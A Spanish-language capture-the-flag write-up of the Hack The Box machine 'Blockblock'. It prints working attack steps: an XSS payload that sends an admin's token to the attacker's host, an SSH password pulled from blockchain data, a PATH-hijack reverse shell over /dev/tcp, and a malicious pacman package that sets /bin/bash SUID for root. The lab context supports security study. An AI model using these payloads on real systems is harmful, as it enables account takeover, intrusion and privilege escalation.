# Blockblock Escrito - Hack The Box

## Introducción

Blockblock es una máquina desafiante de Hack The Box que pone a prueba habilidades en reconocimiento, explotación web, escalada de privilegios y vulnerabilidades relacionadas con blockchain. Este escrito describe los pasos tomados para enumerar, explotar y, finalmente, obtener acceso root en la máquina.

---

## Reconocimiento Inicial

### Escaneo Nmap

El escaneo inicial de puertos revela tres puertos abiertos:

```bash
nmap -p- -sV -Pn 10.10.11.43 -v -sT --min-rate 5000
```

Salida:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7 (protocol 2.0)
80/tcp   open  http    Werkzeug/3.0.3 Python/3.12.3
8545/tcp open  unknown
```

---

## Enumeración Web

### Registro y Explotación

Al acceder al servicio web en el puerto 80, registramos una cuenta de usuario y notamos la opción de reportar a otros usuarios. Esta funcionalidad parece ser vulnerable a XSS.

Creamos la siguiente carga útil en un archivo llamado `shat.js`:

```javascript
fetch('/api/info')
  .then(response => response.text())
  .then(text => {
    fetch('http://10.10.14.8:2000/log?' + new URLSearchParams({ log: btoa(text) }), {
      mode: 'cors' // Permitir solicitudes de origen cruzado
    });
  });
```

Luego, alojamos el archivo en un servidor HTTP de Python:

```bash
python3 -m http.server 2000
```

Insertamos la siguiente carga útil XSS en el campo "Report User":

```html
<img src="x" onerror="var script=document.createElement('script');script.src='http://10.10.14.8:2000/shat.js';document.head.appendChild(script);">
```

Cuando el administrador procesa el reporte, se envía una solicitud que contiene información sensible a nuestro servidor. La solicitud interceptada luce así:

```
GET /log?log=eyJyb2xlIjoiYWRtaW4iLCJ0b2tlbiI6ImV5SmhiR2NpT2lKSVV6STFOaUlz...
```

### Decodificación del Token del Administrador

Extraemos la carga útil codificada en Base64 y la decodificamos:

```bash
echo "eyJyb2xlIjoiYWRtaW4iLCJ0b2tlbiI6ImV5..." | base64 -d
```

Salida:

```json
{"role":"admin","token":"<JWT_TOKEN>","username":"admin"}
```

Modificamos la cookie de sesión con el token de administrador extraído, obteniendo acceso a funciones exclusivas de administrador.

---

## Interacción con Blockchain

### Interceptando Solicitudes

Usando Burp Suite, interceptamos solicitudes API realizadas desde el panel de administrador. Identificamos la siguiente llamada JSON-RPC:

```json
{
  "jsonrpc": "2.0",
  "method": "eth_getBalance",
  "params": ["0x38D681F08C24b3F6A945886Ad3F98f856cc6F2f8", "latest"],
  "id": 1
}
```

Para recopilar información adicional, creamos una nueva solicitud para obtener un bloque por número:

```json
{
  "jsonrpc": "2.0",
  "method": "eth_getBlockByNumber",
  "params": [
    "0x10d4f",
    true
  ],
  "id": 1
}
```

La respuesta contiene datos sensibles. Decodificar el valor hexadecimal revela:

```
keira//SomedayBitCoinWillCollapse
```

Esta es la contraseña SSH para el usuario `keira`.

---

## Acceso de Usuario

### Acceso SSH

Usando las credenciales obtenidas:

```bash
ssh keira@10.10.11.43
Password: SomedayBitCoinWillCollapse
```

---

## Escalada de Privilegios a Paul

### Explotación de Vulnerabilidad PATH

Observamos que `keira` puede ejecutar un script con permisos de `paul`:

```bash
sudo -u paul PATH=/tmp/rev:$PATH /home/paul/.foundry/bin/forge completions bash
```

Preparamos una carga útil de shell reverso:

```bash
mkdir -p /tmp/rev
cat > /tmp/rev/git << EOF
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
EOF
chmod +x /tmp/rev/git
```

Configuramos un listener:

```bash
nc -nlvp <PORT>
```

Ejecutar el comando proporciona un shell como `paul`.

---

## Escalada de Privilegios a Root

### Abuso de Instalación de Paquetes

Creamos un paquete malicioso de Arch Linux para modificar los permisos de bash:

```bash
cd /dev/shm
cat > PKGBUILD << EOF
pkgname=exp
pkgver=1.0
pkgrel=1
arch=('any')
install=exp.install
EOF

echo "post_install() { chmod 4777 /bin/bash; }" > exp.install
makepkg -s
sudo pacman -U *.zst --noconfirm
```

Después de la instalación, `bash` obtiene permisos SUID. Abrimos un shell como root:

```bash
bash -p
```

---

## Conclusión

Blockblock pone a prueba una amplia gama de habilidades, desde la explotación XSS y manipulación de tokens hasta la interacción con la API de blockchain y la escalada de privilegios utilizando técnicas creativas. El recorrido por esta máquina resalta la importancia de una enumeración exhaustiva y la explotación de vulnerabilidades en todos los niveles.

---

*¡Feliz hacking!*
